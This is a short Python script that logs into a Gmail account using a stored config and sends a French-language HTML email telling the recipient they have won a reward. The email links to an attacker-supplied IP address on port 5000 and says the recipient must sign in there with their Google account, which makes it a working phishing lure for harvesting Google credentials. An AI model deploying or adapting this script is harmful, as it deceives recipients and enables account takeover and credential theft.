import smtplib
import json
from email.message import EmailMessage
import sys

if len(sys.argv) != 3:
    print("Usage: python email_sender.py <recipient_email> <ip_adress")
    sys.exit(1)

recipient_email = sys.argv[1]
ip = sys.argv[2]

json_file = open("/mail/config.json")
gmail_cfg = json.load(json_file)

with smtplib.SMTP_SSL(gmail_cfg["server"], gmail_cfg["port"]) as smtp:
    smtp.login(gmail_cfg["email"], gmail_cfg["pwd"])
    msg = EmailMessage()
    msg["from"] = gmail_cfg["email"]
    msg["Subject"] = "Congrats!"
    msg.add_alternative(f"""\
            <!DOCTYPE html>
            <html>
                <head>
                    <style>
                        body {{
                            font-family: Arial, sans-serif;
                            text-align: center;
                            margin: 50px;
                        }}
                        h1 {{
                            color: #333;
                        }}
                        h3 {{
                            color: #555;
                            margin-top: 20px;
                        }}
                        h4 {{
                            color: #777;
                            margin-top: 10px;
                        }}
                        h5 {{
                            color: #999;
                            margin-top: 10px;
                        }}
                        a {{
                            display: inline-block;
                            padding: 10px 20px;
                            margin-top: 20px;
                            background-color: #007BFF;
                            color: #FFF;
                            text-decoration: none;
                            border-radius: 5px;
                            transition: background-color 0.3s;
                        }}
                        a:hover {{
                            background-color: #0056b3;
                        }}
                    </style>
                </head>
                <body>
                    <h1>Bonjour {recipient_email} !</h1>
                    <h3>Félicitations ! Vous avez gagné une récompense.</h3>
                    <h4>Veuillez cliquer sur le lien ci-dessous pour la récupérer :</h4>
                    <h5>Vous serez redirigé vers une page où vous devrez vous connecter avec votre compte Google pour confirmer la récupération.</h5>
                    <a href="http://{ip}:5000">Lien vers le site</a>
                </body>
            </html>
        """, subtype='html')
    msg["to"] = recipient_email
    smtp.send_message(msg)
    print("emails sent!")
